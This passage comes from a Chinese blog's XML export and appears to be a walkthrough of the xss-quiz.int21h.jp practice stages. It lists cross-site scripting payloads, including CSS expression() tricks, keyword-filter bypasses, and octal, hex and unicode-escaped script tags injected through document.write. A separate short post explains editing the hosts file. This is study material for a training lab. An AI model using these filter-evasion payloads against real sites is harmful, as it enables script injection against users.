&lt;img style=&quot;xss:expression(alert(&apos;xss&apos;))&quot;&gt;  
</code></pre><p>(2)css代码中js，vs脚本</p>
<pre><code>body{backgroud-image:url(javascript:alert(&apos;xss&apos;))}  
body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))} 
</code></pre><h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8</a></p>
<p>发现expression关键字被正则了！绕过<strong>(IE8即以下！)</strong>：<br></p>
</blockquote>
<p>1.编码绕过</p>
<pre><code>aa:\0065xpression(onfocus = function(){alert(document.domain)}) ERROR
</code></pre><p>2.<code>\</code> 绕过</p>
<pre><code>aa:e\xpression(onfocus = function(){alert(document.domain)}) ERROR
</code></pre><p>3.<code>\0</code> 绕过</p>
<pre><code>aa:e\0xpression(onfocus = function(){alert(document.domain)}) ok
</code></pre><p>4.<code>\**\</code>绕过</p>
<pre><code>aa:e\**\xpression(onfocus = function(){alert(document.domain)}) ERROR
</code></pre><p>5.<code>/**/</code>绕过</p>
<blockquote>
<p>好像是注解绕过</p>
</blockquote>
<pre><code>aa:e/**/xpression(onfocus = function(){alert(document.domain)}) ok
</code></pre><p><strong><font color="orange"><code>\uxxxx</code>这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 <code>\u5c0f</code> 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
<h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1</a></p>
</blockquote>
<p>输入：</p>
<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
</code></pre><p>源码查看，不是审查元素</p>
<pre><code>&lt;script&gt;document.write(&quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&quot;);&lt;/script&gt;
</code></pre><p>可以看到 <code>&lt; &gt;</code>这两个字符被替换为<code>&quot;&amp;lt;</code>和<code>&amp;gt</code>;，说明有过滤！</p>
<p>由于此页使用<code>document.write(value)</code>，来写出内容，所以肯定存在注入！</p>
<p>控制台</p>
<pre><code>alert(&quot;\u003c&quot;) //显示符号 &lt;
\u0061lert(&quot;123&quot;) //123
</code></pre><p>JS支持这种写法，此处注入：</p>
<pre><code>\\74script\\76alert(document.domain);\\74/script\\76
</code></pre><p>能成功的原因在于使用：</p>
<pre><code>document.write();
</code></pre><p>执行了js，将字符串编译了！</p>
<h2 id="JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt"><a href="#JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt" class="headerlink" title="JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;参见&gt;"></a>JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;<a href="http://www.cnblogs.com/ecalf/archive/2012/09/04/unicode.html" target="_blank" rel="noopener">参见</a>&gt;</h2><blockquote>
<p><strong>所有的ASCII码都可以用<code>\</code>加数字（一般是8进制数字）来表示。<code>\x</code>表示后面的字符是十六进制数，<code>\</code>表示后面的字符是八进制数。</strong><br> </p>
</blockquote>
<p>八进制（<code>\</code>+八进制）</p>
<pre><code>\74script\76alert(document.domain);\74/script\76
</code></pre><p>十六进制</p>
<pre><code>\x3cscript\x3ealert(document.domain);\x3c/script\x3e
</code></pre><p>发现过滤了单个 <code>\</code></p>
<p>Octonary：</p>
<pre><code>\\74script\\76alert(document.domain);\\74/script\\76
</code></pre><p>Hexadecimal</p>
<pre><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
</code></pre><p><strong>Unicode</strong>好像也可以！</p>
<blockquote>
<p><code>\u</code> 加 4个16进制字符表示一个字符的编码</p>
</blockquote>
<pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
</code></pre><h1 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d</a></p>
</blockquote>
<p>过滤了十六进制，我们还有八进制和unicode</p>
<pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e

\\74script\\76alert(document.domain);\\74/script\\76
</code></pre><h2 id="第十七十八（UNSOLVED）"><a href="#第十七十八（UNSOLVED）" class="headerlink" title="第十七十八（UNSOLVED）"></a>第十七十八（UNSOLVED）</h2><blockquote>
<p>需要配合IE6即以下浏览器解决！</p>
</blockquote>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>hosts使用</title>
    <url>/2016/08/01/hosts/</url>
    <content><![CDATA[<p></p><h2>关于hosts二三事</h2><br>没有任何的意思，方便程序员查资料！<p></p>
<p></p><h3>原理</h3><p></p>
<blockquote>
<p>总的来说，Google配合baidu可以发挥出中文搜索的功力了。百度的优点，常见问题搜索比较全面，一般能找到心仪答案，但是对于较为生僻的问题，一般主要是不准。<br><br>使用google一般比较准确，前面的搜索项能代表基本问题。一般配合baidu中文搜索的能力补全。平时不可能一直开着vpn或者shadowsocks。<br></p>
</blockquote>
<p><strong>p.s.</strong>发现了个好玩的：国外IP访问国内网页，竟然有地域限制，蛤蛤！<br></p>
<blockquote>
<p>DNS污染（域名污染），将网址解析为不正确的IP地址，使得访问不到正确的IP。但是计算机，实际上是先在本地hosts文件中查看，如果解析出正确的IP，则可以直接访问，不需要访问DNS服务器了。<br></p>
</blockquote>
<p><strong>p.s.</strong>hosts需要不定期更新（当你上不去的时候）。</p>
<p></p><h3>关于修改hosts</h3><br><strong>windows:</strong>C:\Windows\System32\drivers\etc <br><p></p>
<blockquote>
<p>目录下的hosts文件，权限问的话，先拷出来，改完后，覆盖回去。最后<strong>cmd</strong>下<strong>ipconfig /flushdns</strong><br></p>
</blockquote>
<p><strong>ubuntu:</strong>/etc<br></p>
<blockquote>
<p>目录下hosts修改。<br></p>
</blockquote>
<a id="more"></a>
<p><strong>Google使用技巧</strong></p>
<p><img src="http://i.imgur.com/FpgqLx0.jpg" alt></p>
<p></p><h3>经常去的源</h3><br><a href="https://laod.org/hosts/2016-google-hosts.html" target="_blank" rel="noopener">laod</a><br><br><a href="https://serve.netsh.org/pub/ipv4-hosts/" target="_blank" rel="noopener">奶齿</a><p></p>
]]></content>
      <tags>
        <tag>hosts</tag>
      </tags>
  </entry>
</search>
